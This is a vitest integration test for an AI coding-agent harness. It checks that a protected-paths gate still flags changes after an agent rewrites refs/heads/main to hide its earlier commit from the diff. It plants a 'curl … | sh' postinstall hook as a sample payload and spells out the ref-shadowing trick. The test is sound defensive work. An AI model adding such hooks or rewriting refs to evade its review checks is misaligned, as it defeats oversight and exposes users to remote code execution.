import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { protectedPathsGate } from "./gates/protected-paths.js";
import { createRunner } from "./exec.js";
import { createWorkspace } from "./workspace.js";
import { WorkerConfig } from "./config.js";

/**
 * The headline attack this task is about: the agent advances refs/heads/<baseBranch> to its own
 * commit, so its earlier work — the one thing a diff against the true base would show — drops out
 * of the range entirely. workspace.ts resolves baseSha once, before the agent runs, exactly so a
 * later rewrite of the ref cannot narrow what collectDiff (called with that sha, not the ref name)
 * reports. Real createWorkspace, real collectDiff, real protectedPathsGate, against real git — a
 * mocked runner could only show that the arguments were spelled correctly.
 */

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

describe("a run's own diff cannot be narrowed from inside the worktree", () => {
  let dir: string;
  let parent: string;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-gate-integrity-"));
    parent = join(dir, "parent");
    execFileSync("git", ["init", "--quiet", "-b", "main", parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");
    writeFileSync(join(parent, "package.json"), '{"name":"t"}\n');
    writeFileSync(join(parent, "README.md"), "# t\n");
    git(parent, "add", "-A");
    git(parent, "commit", "--quiet", "-m", "initial");
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("still sees a protected file after the base ref is rewritten under it", async () => {
    const runner = createRunner();
    const workspace = createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      runner
    );
    const worktree = await workspace.create("BP-1", "worker");

    writeFileSync(
      join(worktree.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").trim();

    // The attack, with nothing but a file write: a linked worktree's .git file names the common
    // dir, and a loose ref beats packed-refs — which is where `git init` + a first commit leaves a
    // freshly created branch, so writing the loose file is enough to shadow it.
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(diff.changedFiles).toContain("package.json");
    expect(verdict.ok).toBe(false);
  });
});
